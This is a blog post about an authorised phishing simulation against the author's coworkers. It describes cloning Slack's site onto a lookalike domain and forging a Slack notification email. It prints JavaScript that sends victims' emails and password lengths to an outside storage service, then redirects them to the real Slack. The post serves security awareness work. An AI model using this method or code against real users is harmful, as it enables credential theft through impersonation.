---
id: 64
path: /posts/64-hacking-your-own-company/
title: "Hacking your own company"
author: joao-justo
date: 2015-11-18
cover: https://subvisual.s3.amazonaws.com/blog/hero/129/image.jpg
retina_cover: https://subvisual.s3.amazonaws.com/blog/hero/129/image@2x.jpg
tags:
  - development
intro: "I have a confession to make. A while ago I hacked my own company."
---

I have a confession to make. A while ago I hacked my own company.

##Motivation

You might be wondering why someone would hack his own company. A company like Subvisual has a transparent communication and processes. So, if I want to know something, all I got to do is ask.

The answer to this question is [Mr. Robot](http://www.imdb.com/title/tt4158110/?ref_=fn_al_tt_1)!
Yes, the TV show.

I’m a big fan of Mr. Robot.
For those of you who don’t know it, it’s a hacker TV series that’s very realistic. Instead of showing some random letters on a terminal they showed the viewers real techniques and exploits.

If you watched the series you certainly have noticed that our favourite hacker Elliot accomplishes some hacks by masquerading as a trustworthy entity and then simply ask for information directly to the victim.

This technique is called a phishing scam and despite being one of the most used exploits on the internet, it’s still one of the most effective.

I was skeptic that people would fall so easily on such a simple exploit so I became very curious on this. After some time I came up with a simple case study:

I wanted to create a phishing scam targeting my co-workers. The goal was to send a fake email to my whole team, containing a link to a malicious site, in order to see how many people would login on it, giving me their credentials.

If you put some thought on the matter your own team members are the perfect test subjects. You spend at least 8 hours per day with them, you know some of their habits, some of their tools and most importantly some of the sites they use and therefore some of the emails they receive. You also have the opportunity to watch first-hand how they will react when they see it.

Now you might be wondering if this is reasonable. After all getting someone’s private information might have a devastating effect on both the victim and the hacker, also worth mentioning that such action is… illegal. Considering that the victim will be sitting next to you this might not seem like a good idea after all. Also worth mentioning that my targets are experienced web developers so their defences are probably a step higher. 

How can this be accomplished in such conditions? If you stick with me a little longer I’ll care to explain.

##Preparation

My first plan was to attack the whole company at once keeping the whole thing secret and then, on a Friday Talk reveal what happened and how many people had fallen. After some days thinking on this and given the reasons above I changed the plan a bit.

The first thing I did was to ask permission and guidance to Roberto, our CEO. He received the idea surprisingly well and like me he was curious to know if our team would be able to recognise a simple phishing scam and if so, how could we improve the company security and awareness. We also shared the same concerns regarding personal information so it was decided that passwords or other relevant information would not be stored. The only thing that I would try to capture was the password length as proof that the given person had been victim of the attack.

With this set I began to prepare the hack.

After some time observing the team I noticed that most of our internal communication is done on [Slack](https://slack.com/), [Trello](https://trello.com/) and [GitHub](https://github.com/). The emails that we received are mostly notifications from these apps so I started to analyse how easily I could create a clone of those and trick my coworkers to login to it.

My weapon of choice was Slack. The main reason for this was the fact that almost all of our important communication is generated on it. Theoretically if someone received an important email saying that he/she missed an important message this person should follow the link to catch up.

Here’s an example of a normal notification email from Slack:

![Regular Slack email](https://subvisual.s3.amazonaws.com/blog/post_image/67/image-1447699776511.png)

The email itself shows the missing mention so you might think that this not an ideal situation. For an efficient phishing scam we usually need some content that requires an action, a hook that leads the victims to follow a malicious link.

For this to work I needed to change the content by inserting a partial message and a call to action button, but maintain the familiar layout and appearance.

##Building the attack

This is the geeky part but there is not much to it on this field. All we need is a simple static web page and some place to save the emails and password lengths.

I chose to host the page on [GitHub Pages](https://pages.github.com/) and to use [Parse](https://parse.com/) as my attack storage for the sake of simplicity.

Then I started searching for a domain that resembled slack.com and indeed I found one available - slaack.co.

To clone the whole slack.com site I used an app called SiteSucker. This duplicates the site directory structure and files on your machine meaning that my cloned slack would look exactly like the original even on mobile.

With this set getting the emails and passwords lengths was very easy. I just removed the code from the login form and added some lines:

```
Parse.initialize(‘xxxxxx’,’xxxxxx’);

var ScammedUser = Parse.Object.extend(‘ScammedUser’);
var scammedUser = new ScammedUser();
	
function onSubmitKey(e) {
  if (e.keyCode == 13)
    onSubmit();
}
	
function onSubmit() {
  var accountDetails = {
    email: $(‘#email’).val(),
    password: $(‘#password’).val().length
  };
			
  if (!accountDetails.email ||
      !accountDetails.password)
    return;
	
  scammedUser.save(accountDetails)
    .then(function(object) {
      console.log(‘Success’, accountDetails);
      window.location.href = realSlackLink;
    });
}
```

Finally, the fake email looked like this:

![Fake Slack email](https://subvisual.s3.amazonaws.com/blog/post_image/68/image-1447699815368.png)

##Attacking

This whole thing was online for more than 3 days, ready and waiting for the perfect opportunity. I chose to strike on a Thursday by the end of the day as people left the office. I sent the fake email. That way, as people arrived home, they would see an email notification from the team. Even better, they would see a notification from their CEO on a channel called “#secretProject” so the curiosity factor was involved.

##Results

In the end 20% of our team fell on the attack (all of them are developers). While this number might seem acceptable, it is not. On such a sensible platform like Slack, where most of our company's communication happens, a malicious attacker only needed one person to gain access to privileged information. Also worth noticing that if someone gained access to Slack this person could easily try to impersonate the victim in order to collect other information from the victim’s coworkers.

I presented this results on a Friday Talk and after some discussion I understood the rest of the people didn’t open the link only because they didn't care about Slack email notifications. I also presented some context and countermeasures about phishing attacks that helped raising the awareness for this kind of vulnerability.

The most important lessons taking from this are:

-
Nobody is safe from being victim of a phishing attack, even experienced developers can easily be victims.

-
It’s hard to identify fake communication from the platforms we use every day. We don’t pay that much attention to it so it’s only natural that our defences are lower than normal.

-
People now better understand the importance of security measures like two factor authentication.

-
It was fun and a completely different approach to this security theme; by feeling the problem people understand better that they need to create defences against such attacks.

On the end what I have to tell you is to go ahead and do the same on your company. It’s easier to construct defences with a real understanding of the problem than just trying to fight something that was not experienced by anyone.

I will try to identify and correct more weaknesses in Subvisual and I hope you will do the same at your own work place.

Happy hacking.
